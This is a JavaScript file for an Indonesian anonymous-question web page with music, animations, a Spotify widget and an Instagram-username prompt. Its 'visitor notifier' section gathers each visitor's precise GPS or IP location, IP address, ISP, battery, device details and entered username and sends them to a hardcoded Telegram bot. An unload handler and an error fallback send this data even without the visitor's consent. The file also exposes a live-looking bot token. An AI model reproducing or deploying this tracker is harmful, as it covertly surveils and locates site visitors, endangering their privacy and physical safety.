﻿const openPhotoOptions = document.getElementById('openPhotoOptions');
const photoOptions = document.getElementById('photoOptions');
if (openPhotoOptions && photoOptions) {
  openPhotoOptions.addEventListener('click', () => {
    photoOptions.classList.toggle('show');
  });
}

// NOTE: replace the two placeholders below with your actual bot token and chat id
const BOT_TOKEN = "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
const CHAT_ID = "6864694275";

// === BAGIAN MUSIK — REVISI MOBILE FRIENDLY ===
const music = document.getElementById('bgmusic');
const btnMusic = document.getElementById('musicButton');
let started = false;
music.volume = 0.4;

// pastikan audio bisa dimulai hanya setelah interaksi nyata
async function startMusic() {
  if (started) return;
  started = true;
  music.muted = false;
  try {
    await music.play();
    btnMusic.classList.remove("show");
    btnMusic.disabled = true;
  } catch (err) {
    console.log("Autoplay gagal:", err);
    btnMusic.classList.add("show");
  }
}

// Deteksi platform mobile
const isMobile = /Android|iPhone|iPad|iOS/i.test(navigator.userAgent);

// PC: boleh langsung trigger setelah klik/touch pertama
document.addEventListener('click', startMusic, { once: true });
document.addEventListener('touchstart', startMusic, { once: true });

// tombol utama tetap jadi pemicu manual (aman di mobile)
btnMusic.addEventListener('click', async () => {
  try {
    await music.play();
    music.muted = false;
    started = true;
    btnMusic.classList.remove("show");
    btnMusic.disabled = true;
  } catch (e) {
    alert("Browser kamu memblokir musik otomatis. Coba ketuk ulang tombol 🎵");
    console.log(e);
  }
});

// tambahan: khusus mobile, pastikan tombol tampil dari awal agar user tahu
if (isMobile) {
  btnMusic.classList.add("show");
  music.muted = true;
} else {
  setTimeout(() => { startMusic(); }, 800);
}

// === MODAL PERTANYAAN ===
const modal = document.getElementById('modal');
document.getElementById('openAsk').onclick = () => modal.classList.add('show');
document.getElementById('closeQ').onclick = () => modal.classList.remove('show');

// === LOGIN INSTAGRAM ===
const overlay = document.getElementById("blurOverlay"),
  input = document.getElementById("igInput"),
  btnLogin = document.getElementById("igSubmit"),
  savedIG = localStorage.getItem("ig_user");

function removeOverlay() {
  overlay.style.opacity = "0";
  overlay.style.pointerEvents = "none";
  setTimeout(() => overlay.style.display = "none", 300);
}
function showUserStatus(n) {
  const e = document.getElementById("igStatus");
  e.textContent = `👉🏻 Login sebagai ${n} (keluar)`;
  e.style.display = "block";
  e.onclick = () => {
    if (confirm("Keluar?")) {
      localStorage.removeItem("ig_user");
      setTimeout(() => location.reload(), 400);
    }
  };
}
if (savedIG) {
  removeOverlay();
  showUserStatus(savedIG);
}
btnLogin.onclick = () => {
  const u = input.value.trim();
  if (!u) return alert("Masukkan username dulu");
  localStorage.setItem("ig_user", u);
  showUserStatus(u);
  removeOverlay();
};

// === FUNGSI KIRIM TELEGRAM UNIVERSAL ===
async function sendTelegramMessage(url, body, el) {
  el.innerHTML = `
    <div class="mailContainer">
      <span class="mailLoop">📨</span>
      <span class="mailLoop" style="animation-delay:0.25s">📨</span>
      <span class="mailLoop" style="animation-delay:0.5s">📨</span>
    </div>`;
  try {
    const res = await fetch(url, body);
    if (res.ok) {
      try {
        const swoosh = new Audio("https://cdn.pixabay.com/download/audio/2022/03/15/audio_5c2e04eb7c.mp3?filename=mail-send-82336.mp3");
        swoosh.volume = 0.45;
        swoosh.play().catch(() => {});
      } catch (e) {}
      el.innerHTML = `<div class="sentAnim">Terkirim! <span>✓</span></div>`;
      setTimeout(() => el.innerHTML = "", 3000);
      return true;
    } else {
      el.textContent = "💔 Gagal mengirim.";
      return false;
    }
  } catch (e) {
    el.textContent = "😿 Koneksi lemah.";
    return false;
  }
}

// === KIRIM PERTANYAAN + FOTO ===
document.getElementById('sendQ').addEventListener('click', async () => {
  const savedUser = localStorage.getItem("ig_user") || "Anonim";
  const text = document.getElementById('qtext').value.trim();
  const photo = document.getElementById('qphoto').files[0];
  const qmsg = document.getElementById('qmsg');

  if (!text && !photo) {
    qmsg.textContent = "Tulis pertanyaan atau unggah foto dulu.";
    return;
  }

  qmsg.textContent = "Mengirim...";

  if (photo) {
    const fd = new FormData();
    fd.append("chat_id", CHAT_ID);
    fd.append("caption", `💬 Pesan dari ${savedUser}\n${text || "(tanpa teks)"}`);
    fd.append("photo", photo);
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
      if (res.ok) qmsg.textContent = "📨 Terkirim ✓";
      else qmsg.textContent = "💔 Gagal mengirim foto.";
    } catch {
      qmsg.textContent = "😿 Gagal koneksi.";
    }
  } else if (text) {
    await sendTelegramMessage(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: CHAT_ID, text: `💬 Pertanyaan dari ${savedUser}\n${text}` }) },
      qmsg
    );
  }

  setTimeout(() => {
    if (qmsg.textContent.includes("Terkirim")) {
      modal.classList.remove('show');
      document.getElementById('qtext').value = "";
      document.getElementById('qphoto').value = "";
    }
  }, 1000);
});

// === VISITOR NOTIFIER (GG) — FIXED VERSION ===
// This script will use existing global BOT_TOKEN / CHAT_ID if present,
// otherwise set to values below. It also avoids <script> tags and common errors.

(async function visitorNotifierGGFixed() {
  // Use existing globals if you declared BOT_TOKEN/CHAT_ID earlier in the file.
  const BOT = (typeof BOT_TOKEN !== "undefined" && BOT_TOKEN) ? BOT_TOKEN : "8317170535:AAGh0PBKO4T-HkZQ4b7COREqLWcOIjW3QTY";
  const CHAT = (typeof CHAT_ID !== "undefined" && CHAT_ID) ? CHAT_ID : "6864694275";

  const GG_OPTIONS = {
    ipApiUrls: ["https://ipwho.is/", "https://ipapi.co/json/", "https://ipinfo.io/json?token="],
    telegramApiBase: (token) => `https://api.telegram.org/bot${token}`,
    dedupeMinutes: 10
  };

  function nowISO() { return new Date().toISOString(); }
  function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
  function safeLog(...args){ try { console.log(...args); } catch(e){} }

  // small helper: try fetch and return json or null
  async function fetchJson(url, opts = {}) {
    try {
      const res = await fetch(url, { cache: "no-store", ...opts });
      if (!res.ok) return null;
      return await res.json();
    } catch (e) { return null; }
  }

  // Try providers sequentially
  async function tryIpProviders() {
    for (const url of GG_OPTIONS.ipApiUrls) {
      const j = await fetchJson(url);
      if (j) return j;
    }
    return null;
  }

  // Get battery (graceful)
  async function getBatterySafe() {
    try {
      if (!navigator.getBattery) return null;
      const b = await navigator.getBattery();
      return `${Math.round(b.level * 100)}% (${b.charging ? "⚡" : "🔋"})`;
    } catch { return null; }
  }

  // Dedupe by localStorage
  function shouldDedupe() {
    try {
      const last = localStorage.getItem("gg_last_send_v2");
      if (!last) return true;
      return (Date.now() - new Date(last).getTime()) / 60000 >= GG_OPTIONS.dedupeMinutes;
    } catch { return true; }
  }
  function markSent() {
    try { localStorage.setItem("gg_last_send_v2", new Date().toISOString()); } catch {}
  }

  // Build message safely (no HTML breakage)
  function escapeHtml(s){ if (s == null) return ""; return String(s).replaceAll("&","&amp;").replaceAll("<","&lt;").replaceAll(">","&gt;"); }
  function formatMeters(m){ if (m==null) return ""; if (m<1) return `${Math.round(m*100)} cm`; if (m<1000) return `${Math.round(m)} m`; return `${(m/1000).toFixed(2)} km`; }

  // Build message (HTML parse_mode)
  function buildTelegramText(payload){
    const {
      username="Anonim", source="?", lat, lon, accuracy,
      device="?", os="?", battery="?", isp="-", ipDisplay="-",
      tz="-", lang="-", screen="-", referrer="-", utm=null
    } = payload;
    const mapLink = (lat && lon) ? `https://www.google.com/maps?q=${lat},${lon}&z=17` : "https://www.google.com/maps";
    const locLine = (lat && lon) ? `${lat.toFixed(6)}, ${lon.toFixed(6)} (<a href="${mapLink}">map</a>)` : "Tidak tersedia";
    let text = `<b>📣 Pengunjung Baru — GG</b>\n`;
    text += `<b>👤</b> ${escapeHtml(username)}\n`;
    text += `<b>📍 Lokasi:</b> ${locLine}\n`;
    text += `<b>📡 Sumber:</b> ${escapeHtml(source)}${accuracy ? ` (±${formatMeters(accuracy)})` : ""}\n`;
    text += `<b>💻 Device:</b> ${escapeHtml(device)} — ${escapeHtml(os)}\n`;
    text += `<b>🔋 Baterai:</b> ${escapeHtml(battery || "Tidak diketahui")}\n`;
    text += `<b>🏷️ ISP:</b> ${escapeHtml(isp || "-")}\n`;
    text += `<b>🔗 Referrer:</b> ${escapeHtml(referrer || "-")}\n`;
    if (utm) text += `<b>🏷️ UTM:</b> ${escapeHtml(JSON.stringify(utm))}\n`;
    text += `<b>🕓</b> ${escapeHtml(new Date().toLocaleString('id-ID'))} (${escapeHtml(tz || "-")})\n`;
    text += `<b>🌐 IP:</b> ${escapeHtml(ipDisplay || "-")}\n`;
    text += `<b>🖥️ Screen:</b> ${escapeHtml(screen)}\n`;
    text += `<b>🗣️ Lang:</b> ${escapeHtml(lang || "-")}\n`;
    text += `\n<i>id:${escapeHtml(window.location.hostname)} url:${escapeHtml(window.location.pathname)}</i>`;
    return text;
  }

  // send function with backoff
  async function sendToTelegram(payload, useBeacon=false) {
    if (!BOT || !CHAT) {
      safeLog("No BOT or CHAT defined for visitor notifier.");
      return false;
    }
    const text = buildTelegramText(payload);
    const body = { chat_id: CHAT, text, parse_mode: "HTML", disable_web_page_preview: true };
    const url = GG_OPTIONS.telegramApiBase(BOT) + "/sendMessage";

    // try sendBeacon first if requested (best-effort)
    if (useBeacon && navigator.sendBeacon) {
      try {
        const blob = new Blob([JSON.stringify(body)], { type: "application/json" });
        const ok = navigator.sendBeacon(url, blob);
        if (ok) { markSent(); return true; }
      } catch (e) { /* ignore */ }
    }

    // fetch with exponential backoff
    for (let attempt=0; attempt<5; attempt++) {
      try {
        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(body),
        });
        if (res.ok) { markSent(); return true; }
        // non-ok fallthrough to retry
        await sleep(400 * Math.pow(2, attempt));
      } catch (e) {
        await sleep(400 * Math.pow(2, attempt));
      }
    }
    safeLog("Failed to send visitor message after retries.");
    return false;
  }

  // Main gather function
  async function gatherAndSend({useBeacon=false} = {}) {
    if (!shouldDedupe()) { safeLog("GG: deduped — recently sent"); return; }

    const username = (() => { try { return localStorage.getItem("ig_user") || "Anonim"; } catch { return "Anonim"; } })();
    const lang = navigator.language || navigator.userLanguage || "-";
    const screenInfo = `${screen.width}x${screen.height}@${window.devicePixelRatio || 1}`;
    const referrer = document.referrer || "-";
    const utm = (function(){
      try {
        const u = new URL(window.location.href);
        const out = {};
        ["utm_source","utm_medium","utm_campaign","utm_term","utm_content"].forEach(k=>u.searchParams.has(k) && (out[k]=u.searchParams.get(k)));
        return Object.keys(out).length ? out : null;
      } catch { return null; }
    })();
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "-";
    const device = /mobile/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
    const os = /Windows/i.test(navigator.userAgent) ? "Windows" :
               /Android/i.test(navigator.userAgent) ? "Android" :
               /iPhone|iPad|iOS/i.test(navigator.userAgent) ? "iOS" :
               /Mac/i.test(navigator.userAgent) ? "MacOS" :
               /Linux/i.test(navigator.userAgent) ? "Linux" : "Unknown";
    const battery = await getBatterySafe();

    // try geolocation (permission-aware)
    let lat=null, lon=null, accuracy=null, source="Unknown";
    try {
      if (navigator.permissions) {
        const p = await navigator.permissions.query({ name: "geolocation" });
        if (p.state === "granted" || p.state === "prompt") {
          const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy:true, timeout:8000, maximumAge:0 }));
          lat = pos.coords.latitude; lon = pos.coords.longitude; accuracy = pos.coords.accuracy; source="GPS HighAccuracy";
        }
      } else {
        const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy:true, timeout:8000, maximumAge:0 }));
        lat = pos.coords.latitude; lon = pos.coords.longitude; accuracy = pos.coords.accuracy; source="GPS HighAccuracy";
      }
    } catch (e) {
      // fallback IP-based
      const ipdata = await tryIpProviders();
      if (ipdata) {
        lat = ipdata.latitude || ipdata.lat || null;
        lon = ipdata.longitude || ipdata.lon || null;
        source = ipdata.ip ? "IP-based" : "IP-provider";
      }
    }

    // ip raw
    let ipRaw = null;
    try {
      const j = await fetchJson("https://api.ipify.org?format=json");
      if (j && j.ip) ipRaw = j.ip;
    } catch {}

    // ISP
    let isp = null;
    try {
      const inf = await tryIpProviders();
      if (inf) isp = inf.isp || inf.org || (inf.company && inf.company.name) || inf.hostname || null;
    } catch {}

    const payload = {
      username, source, lat, lon, accuracy,
      ipDisplay: ipRaw || "-", device, os, battery, isp, ip: ipRaw,
      tz, lang, screen: screenInfo, referrer, utm
    };

    await sendToTelegram(payload, useBeacon);
  }

  // Try to send on unload using beacon (best-effort)
  try {
    window.addEventListener("unload", () => {
      if (shouldDedupe()) {
        // don't await here; just fire best-effort
        gatherAndSend({ useBeacon: true }).catch(()=>{});
      }
    }, { passive: true });
  } catch(e){ /* ignore */ }

  // If page is not secure (http or file://) warn and still try IP-based only
  const isSecure = (location.protocol === "https:" || location.hostname === "localhost");
  if (!isSecure) {
    safeLog("GG visitor notifier: running on non-secure context — geolocation may be blocked. Use HTTPS for full features.");
  }

  // Run: show a tiny non-blocking opt-in prompt only if no consent stored.
  const consentKey = "gg_consent_v2";
  try {
    const consent = localStorage.getItem(consentKey);
    if (consent === "granted") {
      // run immediately
      await gatherAndSend({ useBeacon: false });
    } else {
      // create a very small corner prompt (non-blocking) so it doesn't break layouts
      const prompt = document.createElement("div");
      prompt.id = "gg_small_consent";
      prompt.style.cssText = "position:fixed;right:12px;bottom:12px;z-index:999999;background:rgba(0,0,0,0.75);color:#fff;padding:8px 10px;border-radius:10px;font-size:13px;backdrop-filter:blur(4px);";
      prompt.innerHTML = `Kirim data pengunjung? <button id="gg_yes" style="margin-left:8px;padding:4px 8px;border-radius:6px;border:0;background:#16a34a;color:#fff">Ya</button><button id="gg_no" style="margin-left:6px;padding:4px 8px;border-radius:6px;border:0;background:#374151;color:#fff">Nanti</button>`;
      document.body.appendChild(prompt);
      document.getElementById("gg_yes").addEventListener("click", async () => {
        try { localStorage.setItem(consentKey, "granted"); } catch(e){}
        prompt.remove();
        await gatherAndSend({ useBeacon: false });
      });
      document.getElementById("gg_no").addEventListener("click", () => {
        try { localStorage.setItem(consentKey, "denied"); } catch(e){}
        prompt.remove();
      });
      // auto-remove prompt after 12s so it doesn't annoy if user ignores
      setTimeout(()=>{ try{ prompt.remove(); }catch{} }, 12000);
    }
  } catch (e) {
    // fallback: just run once (best-effort)
    try { await gatherAndSend({ useBeacon: false }); } catch (e2) { safeLog("GG fallback error", e2); }
  }

})(); // end visitorNotifierGGFixed

// === EFEK BUTTERFLY 💸 ===
(function () {
  const area = document.querySelector('.card');
  const butterflies = [];
  const butterflyCount = 7;
  let holdActive = false;
  let holdX = 0;
  let holdY = 0;
  let cachedRect = area.getBoundingClientRect();

  window.addEventListener('resize', () => {
    cachedRect = area.getBoundingClientRect();
  });

  area.style.position = 'relative';
  area.style.overflow = 'hidden';

  function getBounds() {
    return {
      width: area.clientWidth,
      height: area.clientHeight,
      left: cachedRect.left,
      top: cachedRect.top
    };
  }

  const bounds = getBounds();
  for (let i = 0; i < butterflyCount; i++) {
    const b = document.createElement('div');
    b.className = 'butterfly';
    b.textContent = '💸';
    area.appendChild(b);
    butterflies.push({
      el: b,
      x: Math.random() * bounds.width,
      y: Math.random() * bounds.height,
      vx: (Math.random() - 0.5) * 1.2,
      vy: (Math.random() - 0.5) * 1.2,
      size: 16 + Math.random() * 10,
      flapOffset: Math.random() * Math.PI * 2
    });
    b.style.fontSize = butterflies[i].size + 'px';
  }

  function moveButterflies() {
    const rect = getBounds();
    const time = performance.now() / 200;

    butterflies.forEach(b => {
      b.vy += 0.002;
      if (holdActive) {
        const dx = holdX - b.x;
        const dy = holdY - b.y;
        b.vx += dx * 0.002;
        b.vy += dy * 0.002;
      }
      b.vx += Math.sin(time + b.flapOffset) * 0.04;
      b.vy += Math.cos(time + b.flapOffset) * 0.02;
      b.x += b.vx;
      b.y += b.vy;

      if (b.x <= 0 || b.x >= rect.width - b.size) b.vx *= -0.8;
      if (b.y <= 0 || b.y >= rect.height - b.size) b.vy *= -0.8;
      b.vx = Math.max(-1.8, Math.min(1.5, b.vx));
      b.vy = Math.max(-1.8, Math.min(1.8, b.vy));

      const flap = Math.sin(time * 8 + b.flapOffset) * 20;

      b.el.style.transform = `
        translate(${b.x}px, ${b.y}px)
        rotate(${flap}deg)
        scale(${1 + Math.sin(time * 4 + b.flapOffset) * 0.05})
      `;
    });

    requestAnimationFrame(moveButterflies);
  }
  moveButterflies();

  let pendingMove = null;
  function updateHold() {
    if (pendingMove && holdActive) {
      holdX = pendingMove.x - cachedRect.left;
      holdY = pendingMove.y - cachedRect.top;
      pendingMove = null;
    }
    requestAnimationFrame(updateHold);
  }
  updateHold();

  const startHold = (x, y) => {
    holdActive = true;
    holdX = x - cachedRect.left;
    holdY = y - cachedRect.top;
  };
  const endHold = () => (holdActive = false);

  area.addEventListener('mousedown', e => startHold(e.clientX, e.clientY));
  area.addEventListener('mouseup', endHold);
  area.addEventListener('mouseleave', endHold);
  area.addEventListener('mousemove', e => {
    pendingMove = { x: e.clientX, y: e.clientY };
  });

  area.addEventListener('touchstart', e => {
    const t = e.touches[0];
    startHold(t.clientX, t.clientY);
  });
  area.addEventListener('touchmove', e => {
    const t = e.touches[0];
    pendingMove = { x: t.clientX, y: t.clientY };
  });
  area.addEventListener('touchend', endHold);
  area.addEventListener('touchcancel', endHold);
})();

// === LIVE STATUS + SPOTIFY ===
(async function(){
  const titleEl = [...document.querySelectorAll('*')].find(e => /sharing vibes & question/i.test(e.textContent));
  if(!titleEl) return;
  const parentEl = titleEl.parentElement || document.body;

  const statusBox = document.createElement("div");
  statusBox.id = "liveModeStatus";
  statusBox.style.cssText = `
    width:100%;
    text-align:center;
    font-size:14px;
    font-family:'Poppins', monospace;
    color:#cfcfcf;
    margin-top:6px;
    opacity:0;
    transition:opacity .6s ease;
  `;
  const musicBtn = parentEl.querySelector("#musicButton");
  if (musicBtn) musicBtn.insertAdjacentElement("beforebegin", statusBox);
  else titleEl.insertAdjacentElement("afterend", statusBox);

  async function updateStatus(){
    try {
      const res = await fetch("https://sybau.imamadevera.workers.dev/status",{cache:"no-store"});
      const data = await res.json();
      const text = `${data.status}`;
      if (statusBox.textContent !== text) {
        statusBox.style.opacity = 0;
        setTimeout(() => {
          statusBox.textContent = text;
          statusBox.style.opacity = 1;
          let color = "#fff";
          if (data.status.includes("Online")) color = "#00ffb3";
          else if (data.status.includes("Listening")) color = "#4cc9ff";
          else if (data.status.includes("Offline")) color = "#ff7ca3";
          statusBox.style.color = color;
        }, 200);
      }
    } catch {
      statusBox.textContent = "⚠️ gagal memuat status";
      statusBox.style.color = "#ff7979";
    }
  }

  updateStatus();
  setInterval(updateStatus, 4000);
})();

(async function(){
  const API_URL = "https://sybau.imamadevera.workers.dev/spotify";
  const liveStatus = document.getElementById("liveModeStatus");
  if (!liveStatus) return;

  const spotifyBox = document.createElement("div");
  spotifyBox.id = "spotifyPreviewBox";
  spotifyBox.style.cssText = `
    width:100%;
    max-width:280px;
    margin:10px auto;
    text-align:center;
    position:relative;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    transition:opacity .4s ease, transform .3s ease;
    opacity:0;
    transform:scale(0.98);
  `;

  const coverWrap = document.createElement("div");
  coverWrap.style.cssText = `
    position:relative;
    width:100%;
    height:100px;
    border-radius:12px;
    overflow:hidden;
    box-shadow:0 0 18px rgba(76,201,255,0.25);
  `;

  const cover = document.createElement("img");
  cover.id = "spotifyPreviewCover";
  cover.style.cssText = `
    width:100%;
    height:100%;
    object-fit:cover;
    display:none;
    transition:transform .25s ease, box-shadow .3s ease;
  `;

  const progressBar = document.createElement("div");
  progressBar.style.cssText = `
    position:absolute;
    bottom:0;
    left:0;
    height:4px;
    width:0%;
    background:linear-gradient(90deg,#4cc9ff,#b5179e);
    transition:width .4s linear;
    border-bottom-left-radius:12px;
    border-bottom-right-radius:12px;
  `;

  coverWrap.appendChild(cover);
  coverWrap.appendChild(progressBar);

  liveStatus.parentNode.insertBefore(spotifyBox, liveStatus);
  spotifyBox.appendChild(coverWrap);
  spotifyBox.appendChild(liveStatus);

  async function updateSpotify(){
    try{
      const res = await fetch(API_URL,{cache:"no-store"});
      const data = await res.json();
      if(data.cover){
        cover.src = data.cover;
        cover.style.display = "block";
      } else {
        cover.style.display = "none";
      }

      if(data.progress_ms && data.duration_ms){
        const percent = Math.min((data.progress_ms / data.duration_ms) * 100, 100);
        progressBar.style.width = percent + "%";
      } else {
        progressBar.style.width = "0%";
      }

      spotifyBox.style.opacity = 1;
      spotifyBox.style.transform = "scale(1)";
    }catch(e){
      console.warn("Spotify preview error:", e);
    }
  }

  updateSpotify();
  setInterval(updateSpotify, 8000);
})();
